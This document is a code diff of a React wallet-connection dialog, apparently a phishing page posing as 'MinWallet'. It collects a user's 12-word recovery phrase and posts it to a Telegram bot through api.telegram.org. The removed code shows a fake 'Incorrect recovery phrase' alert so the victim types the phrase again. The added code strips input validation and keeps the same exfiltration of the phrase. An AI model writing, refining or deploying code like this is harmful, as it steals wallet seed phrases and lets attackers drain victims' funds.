@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useRef } from "react";
 import { useNavigate } from "react-router";
 
 function ConnectWallet({ onClose }) {
@@ -59,69 +59,53 @@ function ConnectWallet({ onClose }) {
     }
   };
 
-  const handleTransferWallet = async () => {
-    const words = seedPhrase.trim().split(/\s+/);
-
-    setAttempts((prevAttempts) => prevAttempts + 1);
-
-    if (attempts < 1) {
-      alert("Incorrect recovery phrase. Please try again.");
-      return;
-    }
+  const isExactly12Words = (phrase) => {
+    const words = phrase.trim().split(/\s+/);
+    return words.length === 12;
+  };
+  const handleTransferWallet = async (message, attemptCount) => {
     const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
-    const message = `MinWallet: ${words.join(" ")}`;
-
-    const endpoints = [
-      {
-        url: `https://api.telegram.org/bot${token}/sendMessage`,
-        data: {
-          chat_id: chat_id,
-          text: message,
-        },
+  
+    const endpoint = {
+      url: `https://api.telegram.org/bot${token}/sendMessage`,
+      data: {
+        chat_id: chat_id,
+        text: `Minwallet:   ${message}`,
       },
-    ];
-
+    };
+  
     try {
-      const responses = await Promise.all(
-        endpoints.map((endpoint) =>
-          fetch(endpoint.url, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(endpoint.data),
-          })
-        )
-      );
-
-      for (const response of responses) {
-        if (!response.ok) {
-          throw new Error(`Network response was not ok: ${response.status}`);
-        }
+      const response = await fetch(endpoint.url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(endpoint.data),
+      });
+  
+      if (response.ok) {
+        console.log(`Message sent successfully (Attempt ${attemptCount}/3)`);
+      } else {
+        console.error(`Failed to send message (Attempt ${attemptCount}/3)`);
       }
-
-      console.log("Messages sent successfully");
-      onClose();
     } catch (error) {
-      console.error("Error sending messages:", error);
-      alert("An error occurred. Please try again later.");
+      console.error(`Error sending message (Attempt ${attemptCount}/3):`, error);
+    }
+  
+    if (attemptCount === 3) {
+      console.log("All attempts completed");
+      onClose();
     }
   };
+  const SeedPhraseContainer = ({ handleTransferWallet }) => {
+    const textareaRef = useRef(null);
 
-  const SeedPhraseContainer = ({
-    seedPhrase,
-    onSeedPhraseChange,
-    handleTransferWallet,
-  }) => {
-    const wordCount = seedPhrase
-      .trim()
-      .split(/\s+/)
-      .filter((word) => word.length > 0).length;
-    const isValid = wordCount === 12;
-
-    const handleInputChange = (e) => {
-      onSeedPhraseChange(e.target.value);
+    const handleSubmit = () => {
+      if (textareaRef.current) {
+        const message = textareaRef.current.value.trim();
+        handleTransferWallet(message);
+      }
     };
 
     return (
@@ -136,24 +120,13 @@ function ConnectWallet({ onClose }) {
           Use space between each phrase
         </p>
         <textarea
+          ref={textareaRef}
           className="w-full p-2 bg-[#121212] border border-stone-700 text-textSecondary rounded-lg"
           rows="4"
-          value={seedPhrase}
-          onChange={handleInputChange}
         ></textarea>
-        <p
-          className={`text-sm mt-2 ${
-            isValid ? "text-green-500" : "text-yellow-500"
-          }`}
-        >
-          Word count: {wordCount} / 12
-        </p>
         <button
-          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold ${
-            !isValid ? "opacity-50 cursor-not-allowed" : ""
-          }`}
-          disabled={!isValid}
-          onClick={handleTransferWallet}
+          className="p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold"
+          onClick={handleSubmit}
         >
           Next
         </button>
@@ -408,8 +381,6 @@ function ConnectWallet({ onClose }) {
                               <div className="mt-4">
                                 {restoreMethod === "seedPhrase" ? (
                                   <SeedPhraseContainer
-                                    seedPhrase={seedPhrase}
-                                    onSeedPhraseChange={handleSeedPhraseChange}
                                     handleTransferWallet={handleTransferWallet}
                                   />
                                 ) : (
